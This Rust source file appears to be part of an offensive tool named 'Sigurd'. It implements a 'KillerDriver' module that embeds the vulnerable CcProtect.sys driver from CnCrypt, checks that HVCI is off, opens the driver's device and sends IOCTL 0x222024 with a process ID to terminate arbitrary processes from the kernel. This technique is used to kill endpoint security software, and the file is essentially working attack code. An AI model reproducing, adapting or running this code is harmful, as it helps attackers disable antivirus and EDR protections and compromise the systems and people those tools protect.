use std::ptr::null_mut;
use include_packed::include_packed;

use winapi::{
    ctypes::c_void, 
    um::{
        fileapi::{CreateFileW, OPEN_EXISTING}, handleapi::{CloseHandle, INVALID_HANDLE_VALUE}, ioapiset::DeviceIoControl, winnt::{GENERIC_READ, GENERIC_WRITE},
    }
};

use crate::{
    drivers::KillerDriver, trace, utils::{error::SigurdError, to_wstring}, warn
};

use std::mem::size_of;

#[allow(non_snake_case)]
#[repr(C)]
struct SYSTEM_CODEINTEGRITY_INFORMATION {
    Length: u32,
    CodeIntegrityOptions: u32,
}

#[allow(nonstandard_style)]
const SystemCodeIntegrityInformation: u32 = 103;
const CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED: u32 = 0x400;
const CODEINTEGRITY_OPTION_HVCI_KMCI_STRICTMODE_ENABLED: u32 = 0x1000;

#[link(name = "ntdll")]
unsafe extern "system" {
    fn NtQuerySystemInformation(
        SystemInformationClass: u32,
        SystemInformation: *mut SYSTEM_CODEINTEGRITY_INFORMATION,
        SystemInformationLength: u32,
        ReturnLength: *mut u32,
    ) -> i32;
}

const DRIVER_NAME: &str = "CcProtect";
const VERSION: &str = "0.0.1";

const DRIVER_DEVICE: &str = "\\\\.\\CcProtect";
const IOCTL_KILL: u32 = 0x222024;

pub struct CcProtect {
    device: *mut c_void
}


impl CcProtect {
    fn is_hvci_enabled() -> bool {
        unsafe {
            let mut info = SYSTEM_CODEINTEGRITY_INFORMATION {
                Length: size_of::<SYSTEM_CODEINTEGRITY_INFORMATION>() as u32,
                CodeIntegrityOptions: 0,
            };

            let status = NtQuerySystemInformation(
                SystemCodeIntegrityInformation,
                &mut info,
                info.Length,
                null_mut(),
            );

            if status != 0 {
                return false;
            }

            let options = info.CodeIntegrityOptions;

            (options & CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED != 0)
                || (options & CODEINTEGRITY_OPTION_HVCI_KMCI_STRICTMODE_ENABLED != 0)
        }
    }
}

impl KillerDriver for CcProtect {
    fn new() -> Result<Box<dyn KillerDriver>, SigurdError> where Self: Sized + 'static {
        warn!("CcProtect driver requites HVCI disabled! It will cause BSOD");
        return Ok(Box::new(Self { device: 0 as *mut c_void }));
    }

    fn init(&mut self) -> Result<bool, SigurdError> {
        unsafe {
            if Self::is_hvci_enabled() {
                return Err(SigurdError::default("Can't use CcProtect with HVCI enabled!"));
            }

            let handle = CreateFileW(
                to_wstring(DRIVER_DEVICE).as_ptr(), 
                GENERIC_READ | GENERIC_WRITE, 
                0, null_mut(), 
                OPEN_EXISTING, 0, null_mut(),
            );

            if handle == INVALID_HANDLE_VALUE { 
                return Err(SigurdError::last("Can't get dervice handle"));
            } else {
                trace!("Got device handle");
                self.device = handle;
                return Ok(true);
            }
        }
    }

    fn destruct(&mut self) -> Result<bool, SigurdError> {
        unsafe {
            match CloseHandle(self.device) {
                0 => {
                    return Err(SigurdError::last("Can't close device handle"));
                }
                _ => {
                    trace!("Closed device handle");
                    return Ok(true);
                }
            }
        }
    }

    fn name(&self) -> &'static str {
        return DRIVER_NAME;
    }

    fn version(&self) -> &'static str {
        return VERSION;
    }

    fn description(&self) -> &'static str {
        return "CcProtect Driver from CnCrypt (CcProtect.sys)";
    }

    fn get_file(&self) -> Result<Vec<u8>, crate::utils::error::SigurdError> {
        let v = include_packed!("drivers/CcProtect.sys");
        return Ok(v);
    }

    fn kill(&mut self, pid: u32) -> Result<(), crate::utils::error::SigurdError> {
        unsafe {    
            let mut buffer = pid.to_ne_bytes().to_vec();
            
            let mut bytes = 0u32;
            let success = DeviceIoControl(
                self.device, 
                IOCTL_KILL, 
                buffer.as_mut_ptr() as *mut _, 
                buffer.len() as u32, 
                null_mut(),                     
                0, 
                &mut bytes, 
                null_mut(),
            );
            
            if success != 0 {
                trace!("IOCTRL request send {}", IOCTL_KILL);
                return Ok(());
            } else {
                return Err(SigurdError::last("Failed to kill the process"));
            }
        }
    }
}